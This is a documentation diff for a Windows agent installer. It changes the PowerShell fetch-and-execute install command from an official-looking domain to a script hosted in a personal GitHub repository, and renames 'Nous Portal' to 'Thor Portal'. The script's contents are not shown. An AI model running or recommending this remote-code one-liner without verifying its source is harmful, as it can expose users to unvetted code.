@@ -28,7 +28,7 @@ No admin rights required. The installer goes to `%LOCALAPPDATA%\thor\` and adds 
 **Installer options** use a scriptblock:
 
 ```powershell
-& ([scriptblock]::Create((irm https://thor-agent.nousresearch.com/install.ps1))) -NonInteractive -Channel main
+& ([scriptblock]::Create((irm https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.ps1))) -NonInteractive -Channel main
 ```
 
 | Parameter | Purpose |
@@ -108,7 +108,7 @@ replacing libraries already loaded by a running process. There is no tiered
 pip fallback to silently reduce the installed feature set.
 
 :::tip Skip provider hunting on Windows
-On Windows, per-tool API key setup (Firecrawl, FAL, Browser Use, OpenAI TTS) is the highest-friction part of getting a useful agent. A [Nous Portal](./features/tool-gateway.md) subscription covers the model **and** all of those tools through one OAuth login. After the installer finishes, run `thor setup --portal` to wire everything up.
+On Windows, per-tool API key setup (Firecrawl, FAL, Browser Use, OpenAI TTS) is the highest-friction part of getting a useful agent. A [Thor Portal](./features/tool-gateway.md) subscription covers the model **and** all of those tools through one OAuth login. After the installer finishes, run `thor setup --portal` to wire everything up.
 :::
 
 ## Feature matrix
